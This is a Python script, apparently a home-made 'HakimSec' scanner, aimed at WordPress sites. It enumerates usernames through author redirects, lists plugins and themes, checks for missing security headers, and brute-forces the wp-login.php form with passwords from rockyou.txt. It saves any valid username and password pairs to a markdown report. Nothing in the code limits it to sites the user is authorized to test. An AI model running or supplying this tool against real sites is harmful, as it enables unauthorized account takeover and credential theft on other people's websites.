#!/usr/bin/env python3
import requests, re, os, sys
from bs4 import BeautifulSoup

# === Configuration ===
HEADERS = {'User-Agent': 'Mozilla/5.0 (HakimSec Scanner)'}
WORDLIST = '/sdcard/Download/rockyou.txt'
REPORT_FILE = 'scan_report.md'

def get(url):
    try:
        return requests.get(url, headers=HEADERS, timeout=10)
    except:
        return None

def check_wp(url):
    r = get(url + '/wp-login.php')
    if r and "wordpress" in r.text.lower():
        print("[+] WordPress detected")
        return True
    print("[-] WordPress not detected")
    return False

def get_users(url):
    usernames = set()
    for i in range(1, 5):
        r = get(f'{url}/?author={i}')
        if r and "author" in r.url:
            match = re.search(r'/author/([a-zA-Z0-9-_]+)/', r.url)
            if match:
                usernames.add(match.group(1))
    return list(usernames)

def enum_plugins(html):
    return list(set(re.findall(r'/wp-content/plugins/([a-zA-Z0-9\-_]+)', html)))

def enum_themes(html):
    return list(set(re.findall(r'/wp-content/themes/([a-zA-Z0-9\-_]+)', html)))

def check_headers(url):
    r = get(url)
    if not r: return []
    missing = []
    headers = r.headers
    for h in ['Content-Security-Policy', 'X-Frame-Options', 'Strict-Transport-Security', 'Referrer-Policy']:
        if h not in headers:
            missing.append(h)
    return missing

def brute_force(url, usernames):
    valid = []
    login_url = url + '/wp-login.php'
    if not os.path.exists(WORDLIST):
        print(f"[!] Wordlist not found: {WORDLIST}")
        return valid
    with open(WORDLIST, 'r', encoding='latin-1', errors='ignore') as f:
        passwords = f.readlines()
    for user in usernames:
        for pw in passwords[:20]:  # Use first 20 for quick test
            pw = pw.strip()
            data = {'log': user, 'pwd': pw, 'wp-submit': 'Log In'}
            r = requests.post(login_url, headers=HEADERS, data=data, allow_redirects=False)
            if 'location' in r.headers and '/wp-admin' in r.headers['location']:
                print(f"[+] Valid: {user}:{pw}")
                valid.append((user, pw))
                break
            else:
                print(f"[-] Failed: {user}:{pw}")
    return valid

def gen_cve_links(plugins):
    links = []
    for p in plugins:
        links.append(f"https://www.cvedetails.com/google-search-results.php?q={p}+wordpress+plugin&sa=Search")
    return links

def theme_cves(themes):
    links = []
    for t in themes:
        links.append(f"https://www.cvedetails.com/google-search-results.php?q={t}+wordpress+theme&sa=Search")
    return links

def login_bypass(url):
    results = []
    endpoints = ['/wp-login.php?redirect_to=/wp-admin&reauth=1', '/xmlrpc.php']
    for ep in endpoints:
        r = get(url + ep)
        if r:
            results.append((ep, r.status_code))
    return results

def save_report(url, users, plugins, themes, headers, valids, bypass, plugin_links, theme_links):
    with open(REPORT_FILE, 'w') as f:
        f.write(f"# HakimSec Scan Report for {url}\n\n")
        f.write("## Detected Users\n" + ("\n".join(f"- {u}" for u in users) if users else "None") + "\n\n")
        f.write("## Detected Plugins\n" + ("\n".join(f"- {p}" for p in plugins) if plugins else "None") + "\n\n")
        f.write("## Plugin CVE Links\n" + ("\n".join(f"- {l}" for l in plugin_links) if plugin_links else "None") + "\n\n")
        f.write("## Detected Themes\n" + ("\n".join(f"- {t}" for t in themes) if themes else "None") + "\n\n")
        f.write("## Theme CVE Links\n" + ("\n".join(f"- {l}" for l in theme_links) if theme_links else "None") + "\n\n")
        f.write("## Missing Headers\n" + ("\n".join(f"- {h}" for h in headers) if headers else "None") + "\n\n")
        f.write("## Valid Credentials\n" + ("\n".join(f"- {v}" for v in valids) if valids else "None") + "\n\n")
        f.write("## Login Bypass Attempts\n" + ("\n".join(f"- `{e}`: {s}" for e, s in bypass) if bypass else "None") + "\n\n")
    print(f"[+] Report saved to {REPORT_FILE}")

def main():
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <url>")
        sys.exit(1)
    url = sys.argv[1].rstrip('/')
    if not check_wp(url):
        return
    r = get(url)
    if not r: return
    html = r.text

    print("[*] Scanning users...")
    users = get_users(url)
    print("[*] Scanning plugins/themes...")
    plugins = enum_plugins(html)
    themes = enum_themes(html)
    headers = check_headers(url)
    print("[*] Brute-forcing accounts...")
    valids = brute_force(url, users)
    bypass = login_bypass(url)
    plugin_links = gen_cve_links(plugins)
    theme_links = theme_cves(themes)
    save_report(url, users, plugins, themes, headers, valids, bypass, plugin_links, theme_links)

if __name__ == '__main__':
    main()
